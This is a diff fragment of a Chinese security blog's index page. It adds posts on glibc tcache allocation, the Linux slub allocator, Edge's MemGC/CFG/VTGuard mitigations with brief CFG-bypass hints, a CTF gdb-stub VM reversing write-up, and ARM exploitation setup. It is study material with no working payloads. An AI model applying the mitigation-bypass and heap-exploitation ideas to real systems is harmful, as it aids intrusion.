+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	      if (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = 1;</span><br><span class="line">		  continue;</span><br><span class="line">		&#125;</span><br><span class="line">	      else</span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br></pre></td></tr></table></figure>
+<p>unsortbin会找到一个会往tcache里放，放满了就返回。</p>
+<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line">小于大小，并且没满，直接放入。</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/sulb/">slub</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>slub机制彻底图解分析<br>转载 2017年01月27日 08:57:17标签：slub机制 /slab机制 /linux /kernel /内存管理1333</p>
+<pre><code>内核管理页面使用了2个算法：伙伴算法和slub算法，伙伴算法以页为单位管理内存，但在大多数情况下，程序需要的并不是一整页，而是几个、几十个字节的小内存。于是需要另外一套系统来完成对小内存的管理，这就是slub系统。slub系统运行在伙伴系统之上，为内核提供小内存管理的功能。
+
+ slub把内存分组管理，每个组分别包含2^3、2^4、...2^11个字节，在4K页大小的默认情况下，另外还有两个特殊的组，分别是96B和192B，共11组。之所以这样分配是因为如果申请2^12B大小的内存，就可以使用伙伴系统提供的接口直接申请一个完整的页面即可。
+
+ slub就相当于零售商，它向伙伴系统“批发”内存，然后在零售出去。一下是整个slub系统的框图：
+
+
+
+  一切的一切源于kmalloc_caches[12]这个数组，该数组的定义如下：
+</code></pre><pre><code>struct kmem_cache kmalloc_caches[PAGE_SHIFT] __cacheline_aligned;
+</code></pre><pre><code>每个数组元素对应一种大小的内存，可以把一个kmem_cache结构体看做是一个特定大小内存的零售商，整个slub系统中共有12个这样的零售商，每个“零售商”只“零售”特定大小的内存，例如：有的“零售商”只&quot;零售&quot;8Byte大小的内存，有的只”零售“16Byte大小的内存。
+
+每个零售商(kmem_cache)有两个“部门”，一个是“仓库”：kmem_cache_node，一个“营业厅”：kmem_cache_cpu。“营业厅”里只保留一个slab，只有在营业厅(kmem_cache_cpu)中没有空闲内存的情况下才会从仓库中换出其他的slab。
+所谓slab就是零售商(kmem_cache)批发的连续的整页内存，零售商把这些整页的内存分成许多小内存，然后分别“零售”出去，一个slab可能包含多个连续的内存页。slab的大小和零售商有关。
+</code></pre><p>相关数据结构：</p>
+<pre><code>    物理页按照对象(object)大小组织成单向链表，对象大小时候objsize指定的。例如16字节的对象大小，每个object就是16字节，每个object包含指向下一个object的指针，该指针的位置是每个object的起始地址+offset。每个object示意图如下：
+
+
+void*指向的是下一个空闲的object的首地址，这样object就连成了一个单链表。
+向slub系统申请内存块(object)时：slub系统把内存块当成object看待
+
+slub系统刚刚创建出来，这是第一次申请。    
+此时slub系统刚建立起来，营业厅(kmem_cache_cpu)和仓库(kmem_cache_node)中没有任何可用的slab可以使用，如下图中1所示：
+因此只能向伙伴系统申请空闲的内存页，并把这些页面分成很多个object，取出其中的一个object标志为已被占用，并返回给用户，其余的object标志为空闲并放在kmem_cache_cpu中保存。kmem_cache_cpu的freelist变量中保存着下一个空闲object的地址。上图2表示申请一个新的slab，并把第一个空闲的object返回给用户，freelist指向下一个空闲的object。
+
+slub的kmem_cache_cpu中保存的slab上有空闲的object可以使用。
+这种情况是最简单的一种，直接把kmem_cache_cpu中保存的一个空闲object返回给用户，并把freelist指向下一个空闲的object。
+
+
+slub已经连续申请了很多页，现在kmem_cache_cpu中已经没有空闲的object了，但kmem_cache_node的partial中有空闲的object 。所以从kmem_cache_node的partial变量中获取有空闲object的slab，并把一个空闲的object返回给用户。
+
+
+kmem_cache_cpu中已经都被占用的slab放到仓库中，kmem_cache_node中有两个双链表，partial和full，分别盛放不满的slab(slab中有空闲的object)和全满的slab(slab中没有空闲的object)。然后从partial中挑出一个不满的slab放到kmem_cache_cpu中。
+
+kmem_cache_cpu中中找出空闲的object返回给用户。
+
+
+slub已经连续申请了很多页，现在kmem_cache_cpu中保存的物理页上已经没有空闲的object可以使用了，而此时kmem_cache_node中没有空闲的页面了，只能向内存管理器(伙伴算法)申请slab。并把该slab初始化，返回第一个空闲的object。
+
+
+kmem_cache_node中没有空闲的object可以使用，所以只能重新申请一个slab。
+
+
+
+把新申请的slab中的一个空闲object返回给用户使用，freelist指向下一个空闲object。
+向slub系统释放内存块(object)时，如果kmem_cache_cpu中缓存的slab就是该object所在的slab，则把该object放在空闲链表中即可，如果kmem_cache_cpu中缓存的slab不是该object所在的slab，然后把该object释放到该object所在的slab中。在释放object的时候可以分为一下三种情况：
+
+object在释放之前slab是full状态的时候（slab中的object都是被占用的），释放该object后，这是该slab就是半满（partail）的状态了，这时需要把该slab添加到kmem_cache_node中的partial链表中。
+
+
+
+slab是partial状态时（slab中既有object被占用，又有空闲的），直接把该object加入到该slab的空闲队列中即可。
+该object在释放后，slab中的object全部是空闲的，还需要把该slab释放掉。
+这一步产生一个完全空闲的slab，需要把这个slab释放掉。
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/rtd/">return-to-dl-reslove</a></h1>
   
 
     </header>
@@ -1396,7 +1241,7 @@ for i in range(1, 80):
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1416,11 +1261,10 @@ for i in range(1, 80):
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a></h1>
+    <h1 class="title"><a href="/2018/12/11/pwnable.tw/">pwnable.tw总结</a></h1>
   
 
     </header>
@@ -1454,7 +1298,7 @@ _调用_dl_make_stack_executable。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1474,11 +1318,10 @@ _调用_dl_make_stack_executable。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/patch/">patch</a></h1>
+    <h1 class="title"><a href="/2018/12/11/patch/">patch</a></h1>
   
 
     </header>
@@ -1548,7 +1391,7 @@ _调用_dl_make_stack_executable。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1568,11 +1411,10 @@ _调用_dl_make_stack_executable。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/offbyone/">off-by-one</a></h1>
+    <h1 class="title"><a href="/2018/12/11/offbyone/">off-by-one</a></h1>
   
 
     </header>
@@ -1702,7 +1544,7 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1722,11 +1564,10 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/hor/">House-Of-Rabbit</a></h1>
+    <h1 class="title"><a href="/2018/12/11/hor/">House-Of-Rabbit</a></h1>
   
 
     </header>
@@ -1800,7 +1641,7 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1820,11 +1661,59 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/hfo/">house-of-orange</a></h1>
+    <h1 class="title"><a href="/2018/12/11/MemGC/">几种安全机制</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="MemGC"><a href="#MemGC" class="headerlink" title="MemGC"></a>MemGC</h1><p>memgc是edge的一个防止uaf的机制。</p>
+<h2 id="1、分配"><a href="#1、分配" class="headerlink" title="1、分配"></a>1、分配</h2><p>分配内存时候将一个标记插入chunk中。</p>
+<h2 id="2-释放"><a href="#2-释放" class="headerlink" title="2.释放"></a>2.释放</h2><p>当程序释放内存时，并不回收内存，而是清理标记为。</p>
+<h2 id="3-回收"><a href="#3-回收" class="headerlink" title="3.回收"></a>3.回收</h2><p>当释放的内存到达一定数量，进行扫描，只有没有标记并且在堆栈寄存器中都没有引用的chunk才会被真正回收。</p>
+<h1 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h1><p>检测程序间接跳转地址是否合理，在间接跳转前调用检测函数。</p>
+<p>访问一个bitmap（称为CFGBitmap），其表示在进程空间内所有函数的起始位置。在进程空间内每8个字节的状态对应CFGBitmap中的一位。如果在每组8字节中有函数的起始地址，则在CFGBitmap中对应的位设置为1；否则设置为0。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">一个例子</span><br><span class="line"></span><br><span class="line">目标地址 ：</span><br><span class="line">0x00b613a0 = ‭00000000 10110110 00010011 10100000‬ (b)</span><br><span class="line">首先取高位的3个字节：00000000 10110110 00010011 = 0x00b613</span><br><span class="line">那么CFGbitmap的基地址加上 0x00b613 就是指向一个字节单元的指针。</span><br><span class="line">这个指针最终取到的假设是：</span><br><span class="line">CFGBitmap ：0x10100444 = 0001 0000 0001 0000 0000 0100 0100 0100(b)</span><br><span class="line">接着判断目标地址是否以0x10对齐：地址 &amp; 0xf 是否等于 0 ；</span><br><span class="line"></span><br><span class="line">如果等于0，那偏移是：最低字节二进制位的前5位，这里就是 10100；</span><br><span class="line">若不等于0，则偏移是： 10100|0x1。</span><br><span class="line">这里的例子，0x00b613a0 &amp; 0xf = 0 ，所以偏移： 1010 0 = 20 (d)</span><br><span class="line">这个偏移就是该函数在CFGbitmap中第20位的位置上，若这个位置是1，说明该函数调用是合法有效的，反之则不是。</span><br><span class="line">那么：</span><br><span class="line">CFGBitmap ：0x10100444 = 0001 0000 0001 0000 0000 0100 0100 0100(b)</span><br><span class="line">第20位加粗的 1 ，说明这个调用合法有效。</span><br></pre></td></tr></table></figure>
+<p>绕过CFG保护的思路还包括跳转到有效的API地址（如LoadLibrary）[41]、覆盖堆栈数据（如返回地址）</p>
+<h1 id="VTGuard"><a href="#VTGuard" class="headerlink" title="VTGuard"></a>VTGuard</h1><ul>
+<li>用以检测vftable指针的修改，使用一个canary存储在每个有效虚表的特定位置。vftable使用前，代码会检查canary的值。</li>
+<li>因此攻击者需要去leak/brute-force这个canary值，放在自己伪造的虚表中。</li>
+</ul>
+<p>目前这个只对edge部分类有效</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/hfo/">house-of-orange</a></h1>
   
 
     </header>
@@ -1871,7 +1760,7 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1891,11 +1780,10 @@ ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/hexo/">搭建博客</a></h1>
+    <h1 class="title"><a href="/2018/12/11/hexo/">搭建博客</a></h1>
   
 
     </header>
@@ -1925,7 +1813,7 @@ theme: 新主题的名字
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1945,11 +1833,10 @@ theme: 新主题的名字
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a></h1>
+    <h1 class="title"><a href="/2018/12/11/glibc malloc和free/">glibc malloc和free</a></h1>
   
 
     </header>
@@ -2072,7 +1959,7 @@ sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2092,11 +1979,10 @@ sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/doublefree/">double free</a></h1>
+    <h1 class="title"><a href="/2018/12/11/doublefree/">double free</a></h1>
   
 
     </header>
@@ -2133,7 +2019,7 @@ sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2153,11 +2039,54 @@ sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/brop/">brop</a></h1>
+    <h1 class="title"><a href="/2018/12/11/debug-vm分析/">debug-vm分析</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="debug-vm分析"><a href="#debug-vm分析" class="headerlink" title="debug-vm分析"></a>debug-vm分析</h1><p>分析下强网杯的虚拟机题目。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序大到看不懂，字符串查看</span><br><span class="line">T%02xthread:%02x;</span><br><span class="line">发现是gdb server stub</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ncat -vc ./debug-vm -kl 0.0.0.0 4444</span><br><span class="line">挂起程序</span><br><span class="line">gdb远程连接上去</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Could not check ASLR: Couldn&apos;t get randomize_va_space</span><br><span class="line">Could not check ASLR: Couldn&apos;t get personality</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">[──────────────────────────────────REGISTERS───────────────────────────────────]</span><br><span class="line"> EAX  0 ◂— 0x0</span><br><span class="line"> EBX  0 ◂— 0x0</span><br><span class="line"> ECX  0 ◂— 0x0</span><br><span class="line"> EDX  0 ◂— 0x0</span><br><span class="line"> EDI  0 ◂— 0x0</span><br><span class="line"> ESI  0 ◂— 0x0</span><br><span class="line"> EBP  0 ◂— 0x0</span><br><span class="line"> ESP  0 ◂— 0x0</span><br><span class="line"> EIP  0 ◂— 0x0</span><br><span class="line">[────────────────────────────────────DISASM────────────────────────────────────]</span><br><span class="line"> ► 0x0     inc    edx</span><br><span class="line">   0x1     add    byte ptr [ecx], al</span><br><span class="line">   0x3     add    byte ptr [eax], al</span><br><span class="line">   0x5     add    byte ptr [edx + 1], al</span><br><span class="line">   0x8     add    dword ptr [eax], eax</span><br><span class="line">   0xa     add    byte ptr [eax], al</span><br><span class="line">   0xc     inc    edx</span><br><span class="line">   0xd     add    al, byte ptr [eax]</span><br><span class="line">   0xf     add    byte ptr [eax], al</span><br><span class="line">   0x11    add    byte ptr [eax + 2], cl</span><br><span class="line">   0x14    add    byte ptr fs:[eax], al</span><br><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ eax ebx ecx edx edi esi ebp esp eip eflags  0 ◂— 0x0</span><br><span class="line">01:0004│                                             4 ◂— 0x4</span><br><span class="line">[──────────────────────────────────BACKTRACE───────────────────────────────────]</span><br><span class="line"> ► f 0        0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">逆向花了好大功夫，网上神一句不难，这东西魔改过，不能照着字符串直接搜。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">首先搜索$符号找到gdb_read_byte</span><br><span class="line">然后顺着这个函数找到调用的函数gdb_handlesig</span><br><span class="line">gdb_read_byte里面有个输出字符的函数put_buffer </span><br><span class="line">下面是gdb_handle_packet</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">gdb通信协议</span><br><span class="line">协议定义</span><br><span class="line">        GDB RemoteSerial Protocol（RSP）是一种简单的，通过串口线、网络等至少支持半双工通信的媒介进行ASCII消息传输的协议。</span><br><span class="line"></span><br><span class="line">        RSP包以$符号作为数据包的开始，后跟一个或多个用于组成要发送的消息的ASCII字节，并以#作为数据包的结束。再#后，还有两个16进制的ASCII字符作为要发送的消息的校验和。一个完整的RSP协议数据包如下：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">$m4015bc,2#5a</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        消息的接收方会立即返回‘+’表示正确接收数据，或‘-’表示没有正确接收数据。当返回‘-’时，GDB会将错误码返回给用户，并无条件挂起GDB进程。</span><br><span class="line"></span><br><span class="line">目标机按接收到的指令次序，依次将信息输出在GDB的console中。除非GDB进程中有其他的命令正在执行，否则来自目标机的信息将会在任意时刻输出在console中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set debug remote 1查看交互信息</span><br><span class="line">Sending packet: $T1#85...Ack</span><br><span class="line">Packet received: OK</span><br><span class="line">Sending packet: $m5624f000,1#91...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b53000,1#bf...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">0x00000000 in ?? ()</span><br><span class="line">Sending packet: $m5624f888,4#ac...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b5314d,4#fb...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $me6b5314d,4#fb...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m65,4#38...Ack</span><br><span class="line">Packet received: 00000000</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br><span class="line">Sending packet: $m10042,4#c4...Ack</span><br><span class="line">Packet received: E14</span><br><span class="line">Sending packet: $m0,4#fd...Ack</span><br><span class="line">Packet received: 42000100</span><br></pre></td></tr></table></figure>
+<p>附上rsp协议。<a href="https://blog.csdn.net/HMSIWTV/article/details/8759129" target="_blank" rel="noopener">https://blog.csdn.net/HMSIWTV/article/details/8759129</a></p>
+<p>然后是虚拟机的漏洞挖掘，不特别，不搞了。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/brop/">brop</a></h1>
   
 
     </header>
@@ -2208,7 +2137,7 @@ pop rdx,ret;
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2228,11 +2157,10 @@ pop rdx,ret;
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/bpf/">bpf</a></h1>
+    <h1 class="title"><a href="/2018/12/11/bpf/">bpf</a></h1>
   
 
     </header>
@@ -2250,7 +2178,7 @@ pop rdx,ret;
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -2270,11 +2198,53 @@ pop rdx,ret;
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/afl/">afl</a></h1>
+    <h1 class="title"><a href="/2018/12/11/arm架构初探/">arm架构利用</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="arm架构漏洞利用"><a href="#arm架构漏洞利用" class="headerlink" title="arm架构漏洞利用"></a>arm架构漏洞利用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br><span class="line">qemu安装</span><br><span class="line">apt search &quot;libc6&quot; | grep ARCH</span><br></pre></td></tr></table></figure>
+<h2 id="typo题"><a href="#typo题" class="headerlink" title="typo题"></a>typo题</h2><p>静态连接符号表恢复，参见静态表恢复文章</p>
+<p>qemu打开程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234  ./typo</span><br><span class="line">这道题是静态连接所以不需要-L，但是动态连接的程序需要这样 -L /usr/mipsel-linux-gnu/</span><br><span class="line">gdb-multiarch ./typo -q</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x8b98    mov    fp, #0</span><br><span class="line">   0x8b9c    mov    lr, #0</span><br><span class="line">   0x8ba0    pop    &#123;r1&#125;</span><br><span class="line">   0x8ba4    mov    r2, sp</span><br><span class="line">   0x8ba8    str    r2, [sp, #-4]!</span><br><span class="line">   0x8bac    str    r0, [sp, #-4]!</span><br><span class="line">   0x8bb0    ldr    ip, [pc, #0x10]</span><br><span class="line">   0x8bb4    str    ip, [sp, #-4]!</span><br><span class="line">   0x8bb8    ldr    r0, [pc, #0xc]</span><br><span class="line">   0x8bbc    ldr    r3, [pc, #0xc]</span><br><span class="line">   0x8bc0    bl     #0x9ebc</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ sp  0xf6fff1a0 ◂— 0x1</span><br><span class="line">01:0004│     0xf6fff1a4 —▸ 0xf6fff334 ◂— &apos;./typo&apos;</span><br><span class="line">02:0008│     0xf6fff1a8 ◂— 0x0</span><br><span class="line">03:000c│     0xf6fff1ac —▸ 0xf6fff33b ◂— 0x752f3d5f (&apos;_=/u&apos;)</span><br><span class="line">04:0010│     0xf6fff1b0 —▸ 0xf6fff34f ◂— 0x54554158 (&apos;XAUT&apos;)</span><br><span class="line">05:0014│     0xf6fff1b4 —▸ 0xf6fff372 ◂— 0x5353454c (&apos;LESS&apos;)</span><br><span class="line">06:0018│     0xf6fff1b8 —▸ 0xf6fff394 ◂— 0x5f4b5447 (&apos;GTK_&apos;)</span><br><span class="line">07:001c│     0xf6fff1bc —▸ 0xf6fff3a7 ◂— 0x5f474458 (&apos;XDG_&apos;)</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     8b98</span><br></pre></td></tr></table></figure>
